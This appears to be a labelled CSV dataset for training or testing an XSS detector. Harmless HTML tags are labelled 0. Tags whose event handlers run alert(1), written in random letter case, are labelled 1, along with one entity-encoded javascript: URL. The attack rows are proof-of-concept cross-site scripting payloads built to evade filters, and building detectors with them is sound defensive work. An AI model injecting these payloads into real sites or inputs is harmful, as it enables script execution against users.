payload,label
<svg ONloaD=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<div ONFOCUs=alert(1)>,1
<test OnMOUSEoVeR=alert(1)>,1
<img attr=value>,0
<test ONmOUsEover=alert(1)>,1
<div attr=value>,0
<svg oncLICk=alert(1)>,1
<test oNloAD=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img attr=value>,0
<svg ONClIcK=alert(1)>,1
<test OnMoUSeOveR=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<img OnMOusEOVeR=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<test ONFOCuS=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img OnFoCUs=alert(1)>,1
<img oNFocus=alert(1)>,1
<svg attr=value>,0
<div onMOuSEOveR=alert(1)>,1
<svg onCLIck=alert(1)>,1
<img ONmOuSeOVER=alert(1)>,1
<div onCliCk=alert(1)>,1
<div attr=value>,0
<img ONclicK=alert(1)>,1
<a onFoCUS=alert(1)>,1
<svg attr=value>,0
<test onfocus=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img oNmoUseovEr=alert(1)>,1
<div ONMoUSeovER=alert(1)>,1
<test onMoUsEOver=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg ONcliCk=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a OnfOCuS=alert(1)>,1
<svg oNMoUSeOvER=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<svg ONlOAD=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<div onmOUSEOvEr=alert(1)>,1
<img attr=value>,0
<svg ONfoCuS=alert(1)>,1
<a attr=value>,0
<test oNcLICk=alert(1)>,1
<svg attr=value>,0
<test Onload=alert(1)>,1
<div OnfOcuS=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a OnmOUSEovER=alert(1)>,1
<svg oNClIcK=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<img OnMouSeoVER=alert(1)>,1
<svg attr=value>,0
<img OnMouSEOver=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div oNLOad=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<img OnCLIcK=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test OnfOcuS=alert(1)>,1
<div ONmOusEoVEr=alert(1)>,1
<a OnlOAd=alert(1)>,1
<test attr=value>,0
<a onlOad=alert(1)>,1
<div oNcLiCk=alert(1)>,1
<svg oNlOad=alert(1)>,1
<test attr=value>,0
<img OnmoUseovEr=alert(1)>,1
<a attr=value>,0
<img OnLOaD=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<test attr=value>,0
<test onfOCUS=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<div oNMOUSeOVEr=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test oNClICk=alert(1)>,1
<svg attr=value>,0
<div oNmouSeoveR=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a onFOcuS=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<a attr=value>,0
<div OnMOUsEoVer=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg ONcLIck=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<svg ONmoUseOVEr=alert(1)>,1
<a attr=value>,0
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:&#x61;&#x6c;&#x65;&#x72;&#x74;(&#x31;),1
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg onLoad=alert(1)>,1
<div attr=value>,0
<img oNfOCUs=alert(1)>,1
<img attr=value>,0
<svg ONcLiCk=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img ONfocUs=alert(1)>,1
<test OnmOuSeOvEr=alert(1)>,1
<img attr=value>,0
<img oNlOAd=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a oNLOad=alert(1)>,1
<a onmOuSeOver=alert(1)>,1
<div attr=value>,0
<a ONMOUseover=alert(1)>,1
<img OnclICk=alert(1)>,1
<test OnfOcus=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a oNClIcK=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<svg onFOcUS=alert(1)>,1
<svg onfOcus=alert(1)>,1
<img OnMOUSeovER=alert(1)>,1
<test oNClIck=alert(1)>,1
<img ONCLiCk=alert(1)>,1
<test attr=value>,0
<a ONcLicK=alert(1)>,1
<div attr=value>,0
<svg ONCLICk=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<test OnfOCus=alert(1)>,1
<a attr=value>,0
<div ONMoUseOvER=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test ONFOcus=alert(1)>,1
<img OnFocuS=alert(1)>,1
<img onlOAD=alert(1)>,1
<div onmOUseOver=alert(1)>,1
<img ONFoCuS=alert(1)>,1
<div onmOuSEOvEr=alert(1)>,1
<test attr=value>,0
<test onmoUseoVER=alert(1)>,1
<test oNFOCus=alert(1)>,1
<a ONLOad=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<img oNLoAd=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img onfOcuS=alert(1)>,1
<div ONMOuSeOVER=alert(1)>,1
<svg onfoCuS=alert(1)>,1
<test oNCLICK=alert(1)>,1
<a attr=value>,0
<div onmouseOVER=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<test onclick=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<a ONLoAD=alert(1)>,1
<div attr=value>,0
<test ONMOUSeOveR=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<div onclick=alert(1)>,1
<a oNlOaD=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg oNcLIck=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<a onMOuseovEr=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<test attr=value>,0
<a oNclicK=alert(1)>,1
<div OncLicK=alert(1)>,1
<div ONloAD=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg oNclicK=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<div onFoCuS=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg OnfOcUS=alert(1)>,1
<test onFOCUS=alert(1)>,1
<test attr=value>,0
<img oNLoAD=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<img ONClick=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a OnLOAd=alert(1)>,1
<svg onMOUSeoVer=alert(1)>,1
<img oNcLICK=alert(1)>,1
<test attr=value>,0
<div OnCliCk=alert(1)>,1
<div oNfoCuS=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<svg OnLOAd=alert(1)>,1
<a oncLick=alert(1)>,1
<test oNMOUSeoVeR=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div ONMouseovEr=alert(1)>,1
<img oncLICK=alert(1)>,1
<a oNMoUSeOvEr=alert(1)>,1
<test oNclICk=alert(1)>,1
<img onmoUSEoVer=alert(1)>,1
<test ONLOAd=alert(1)>,1
<test OnlOad=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img onLOaD=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img OnLoAd=alert(1)>,1
<a attr=value>,0
<svg oNfocus=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img OnloaD=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test oNloAd=alert(1)>,1
<a onClIck=alert(1)>,1
<img oNfoCUS=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a oNclICk=alert(1)>,1
<svg OncliCk=alert(1)>,1
<img attr=value>,0
<a oNFOCus=alert(1)>,1
<div oNclICk=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<a attr=value>,0
<test oNFOCus=alert(1)>,1
<div attr=value>,0
<div ONMOUseOVeR=alert(1)>,1
<svg attr=value>,0
<svg oNfOcuS=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test attr=value>,0
<svg ONMoUSeoVER=alert(1)>,1
<test oncLicK=alert(1)>,1
<svg OncLicK=alert(1)>,1
<test attr=value>,0
<test oNFoCUS=alert(1)>,1
<div OnlOAD=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg OnmouSeoVEr=alert(1)>,1
<svg ONMOUseoVeR=alert(1)>,1
<svg onfOcus=alert(1)>,1
<svg OnMOuseOVER=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img ONClIck=alert(1)>,1
<img ONlOAD=alert(1)>,1
<div attr=value>,0
<a OnFOcUs=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<test oNmoUseOVER=alert(1)>,1
<div attr=value>,0
<img ONLoAd=alert(1)>,1
<div ONfoCUS=alert(1)>,1
<a ONmOusEovER=alert(1)>,1
<test onLoad=alert(1)>,1
<img attr=value>,0
<div onlOad=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<div attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img ONLoaD=alert(1)>,1
<div onFOcUs=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<img OnClIcK=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<div oncLick=alert(1)>,1
<test attr=value>,0
<svg onMOUseover=alert(1)>,1
<img ONMouSeover=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<img onmousEOveR=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<test ONloaD=alert(1)>,1
<a onlOAd=alert(1)>,1
<svg attr=value>,0
<a onloAD=alert(1)>,1
<a ONlOaD=alert(1)>,1
<a oNlOAD=alert(1)>,1
<div attr=value>,0
<svg oNfOcUs=alert(1)>,1
<div oNLOad=alert(1)>,1
<test OnmOuSEovER=alert(1)>,1
<a OnfocUS=alert(1)>,1
<svg OnfOcus=alert(1)>,1
<a attr=value>,0
<div ONLoAD=alert(1)>,1
<a onfOCus=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img onmOusEoVEr=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div OnclIcK=alert(1)>,1
<img attr=value>,0
<div ONloAD=alert(1)>,1
<a OnmoUSeovER=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<img oNLOad=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test onlOaD=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<a oNMOUsEOVeR=alert(1)>,1
<img oNfOCUs=alert(1)>,1
<a attr=value>,0
<div OnmoUSeoVER=alert(1)>,1
<div oNClick=alert(1)>,1
<div attr=value>,0
<img OnmOUSeOvEr=alert(1)>,1
<div attr=value>,0
<svg oNmouSeoVER=alert(1)>,1
<a attr=value>,0
<a onloAD=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<img oncLiCk=alert(1)>,1
<div attr=value>,0
<div oNCliCk=alert(1)>,1
<img oNlOAD=alert(1)>,1
<test attr=value>,0
<test onlOad=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<a oNLOAd=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<div attr=value>,0
<img onLOaD=alert(1)>,1
<div oNmOUSeoVer=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img onfocuS=alert(1)>,1
<svg attr=value>,0
<test onlOAD=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div onClICK=alert(1)>,1
<test onloaD=alert(1)>,1
<img OnmOuseOVer=alert(1)>,1
<img OnmOuseOVER=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img oNcLICk=alert(1)>,1
<div oncliCk=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div OnLOad=alert(1)>,1
<div OnfocUs=alert(1)>,1
<a onLoAd=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<img ONfocus=alert(1)>,1
<a attr=value>,0
<a onfOCuS=alert(1)>,1
<a attr=value>,0
<svg onload=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<img ONloAD=alert(1)>,1
<img onlOad=alert(1)>,1
<a attr=value>,0
<div onFocUs=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg onmousEoVEr=alert(1)>,1
<test OnloAd=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<svg OnclIck=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img onFOCUs=alert(1)>,1
<img onMoUSEOver=alert(1)>,1
<a attr=value>,0
<svg ONLoAD=alert(1)>,1
<div oNclick=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg oNLOAd=alert(1)>,1
<a onCLICK=alert(1)>,1
<div onloaD=alert(1)>,1
<a onmOusEoVer=alert(1)>,1
<img OnlOAd=alert(1)>,1
<svg oNFoCuS=alert(1)>,1
<div attr=value>,0
<img ONlOAd=alert(1)>,1
<svg ONfoCUs=alert(1)>,1
<test onlOAd=alert(1)>,1
<a attr=value>,0
<svg ONfocuS=alert(1)>,1
<div oNLOAD=alert(1)>,1
<div attr=value>,0
<img OnFOcUS=alert(1)>,1
<div attr=value>,0
<div OnfOCUs=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg oNcLICK=alert(1)>,1
<test OnmOUseoVEr=alert(1)>,1
<a attr=value>,0
<img oNLOAD=alert(1)>,1
<svg OnlOad=alert(1)>,1
<img attr=value>,0
<test onCLICk=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<div oNLoaD=alert(1)>,1
<svg attr=value>,0
<svg ONMouseoVer=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test attr=value>,0
<svg ONfocus=alert(1)>,1
<div OnloAd=alert(1)>,1
<test oNLOaD=alert(1)>,1
<svg attr=value>,0
<test OnFocus=alert(1)>,1
<svg attr=value>,0
<test OnclICk=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img onCLick=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<test oNmOuSEOVer=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<div onMouSEOver=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<div ONmOuSeOVEr=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a OnmOUsEOVer=alert(1)>,1
<test ONmOUseOVER=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<svg oNmouseoVer=alert(1)>,1
<div attr=value>,0
<test oncLiCk=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test ONFOCUs=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<a attr=value>,0
<svg OnloAD=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<img onFocUS=alert(1)>,1
<test attr=value>,0
<img oncLiCk=alert(1)>,1
<test attr=value>,0
<a ONLoAD=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a onfOcUS=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<a oNfoCUs=alert(1)>,1
<test oncLiCk=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg OnFOCus=alert(1)>,1
<test oNloAd=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div onloAD=alert(1)>,1
<img attr=value>,0
<svg oNMoUSEOVeR=alert(1)>,1
<img attr=value>,0
<svg OnClICK=alert(1)>,1
<svg oNMoUSeOVER=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a OnmOUseOvEr=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<svg ONmoUSeOVer=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test OnFoCUS=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img OnfOcUs=alert(1)>,1
<test attr=value>,0
<test OnLoad=alert(1)>,1
<a oNLoAD=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<a attr=value>,0
<img ONCLiCk=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<div ONcLiCK=alert(1)>,1
<test attr=value>,0
<img oNFocUs=alert(1)>,1
<img attr=value>,0
<img OnClICK=alert(1)>,1
<img attr=value>,0
<div ONMoUSEover=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<svg oNmouSeovER=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<img ONFOCus=alert(1)>,1
<div ONLoAD=alert(1)>,1
<img oncLiCK=alert(1)>,1
<div attr=value>,0
<img onLOaD=alert(1)>,1
<a attr=value>,0
<test ONMOUsEOvER=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<img oNCLicK=alert(1)>,1
<svg ONclICK=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<img attr=value>,0
<svg OnFOCUS=alert(1)>,1
<a attr=value>,0
<a ONfOcUs=alert(1)>,1
<svg attr=value>,0
<img ONfOcUS=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg OnClIck=alert(1)>,1
<div ONLOAd=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<svg Onload=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<a OnLoad=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div onclICK=alert(1)>,1
<svg oNcLICK=alert(1)>,1
<a OnFoCUS=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div ONloAD=alert(1)>,1
<test attr=value>,0
<img OnmOuSeOver=alert(1)>,1
<svg oncLiCk=alert(1)>,1
<svg attr=value>,0
<svg ONFocus=alert(1)>,1
<div attr=value>,0
<div oNcLiCK=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg ONCLiCk=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img onmOusEOveR=alert(1)>,1
<test OnLOaD=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a OnfoCUS=alert(1)>,1
<a onMouseOVEr=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a OnloaD=alert(1)>,1
<svg ONLoad=alert(1)>,1
<a OnClIck=alert(1)>,1
<img attr=value>,0
<a onClIcK=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<test ONFocUS=alert(1)>,1
<div OnMouSEoVeR=alert(1)>,1
<img onlOaD=alert(1)>,1
<div OnFOCUs=alert(1)>,1
<test OnlOaD=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test OnClIck=alert(1)>,1
<div OncLICk=alert(1)>,1
<a oncLiCk=alert(1)>,1
<a onMOuSeoVer=alert(1)>,1
<test attr=value>,0
<div onfoCus=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<svg onMOUsEOveR=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg OnMoUseovEr=alert(1)>,1
<test attr=value>,0
<img onmOuseOver=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a onFOcUs=alert(1)>,1
<test ONMOuSEOVer=alert(1)>,1
<test oNClIcK=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<test oNLoAD=alert(1)>,1
<test attr=value>,0
<a oNCLICK=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a onCLicK=alert(1)>,1
<a attr=value>,0
<test onMoUSeOvER=alert(1)>,1
<test oNMOUSeOVER=alert(1)>,1
<img onLOAd=alert(1)>,1
<test attr=value>,0
<svg Onload=alert(1)>,1
<svg ONclick=alert(1)>,1
<svg attr=value>,0
<a onmouseover=alert(1)>,1
<a attr=value>,0
<svg onMoUSEoVER=alert(1)>,1
<svg onMOUSeOveR=alert(1)>,1
<div attr=value>,0
<test OnlOaD=alert(1)>,1
<a attr=value>,0
<svg oNLOAd=alert(1)>,1
<a ONFOcUs=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img oNcLick=alert(1)>,1
<svg oNfOcUs=alert(1)>,1
<div oNMOUsEOvEr=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<a oNMoUseoVer=alert(1)>,1
<div OnfocUs=alert(1)>,1
<a ONcLiCK=alert(1)>,1
<div oNfOCUs=alert(1)>,1
<svg onlOAD=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<svg OnLOad=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a onload=alert(1)>,1
<test attr=value>,0
<img oNfoCus=alert(1)>,1
<div attr=value>,0
<svg OnmouSeOveR=alert(1)>,1
<img onlOAD=alert(1)>,1
<img onMOuseover=alert(1)>,1
<img oNLOaD=alert(1)>,1
<svg oNloaD=alert(1)>,1
<div ONcLicK=alert(1)>,1
<img oNFocUS=alert(1)>,1
<test attr=value>,0
<svg ONloAD=alert(1)>,1
<test oNmousEOvEr=alert(1)>,1
<div attr=value>,0
<test onMOUseoVER=alert(1)>,1
<img onCLicK=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test onClICk=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<img OnclICk=alert(1)>,1
<div onFoCUs=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a oNcLICk=alert(1)>,1
<test attr=value>,0
<img oNmOuSeOvEr=alert(1)>,1
<test oncLiCK=alert(1)>,1
<svg attr=value>,0
<img oNmOUSEovEr=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<svg ONLOaD=alert(1)>,1
<img OnmoUSEOVER=alert(1)>,1
<img OncLick=alert(1)>,1
<test attr=value>,0
<img oNCLICk=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<test ONcliCk=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<svg onmouSEover=alert(1)>,1
<img attr=value>,0
<svg oNFocUs=alert(1)>,1
<div attr=value>,0
<a oNMOuSeoVeR=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a onloaD=alert(1)>,1
<a oncLicK=alert(1)>,1
<test onMOUSEOVeR=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
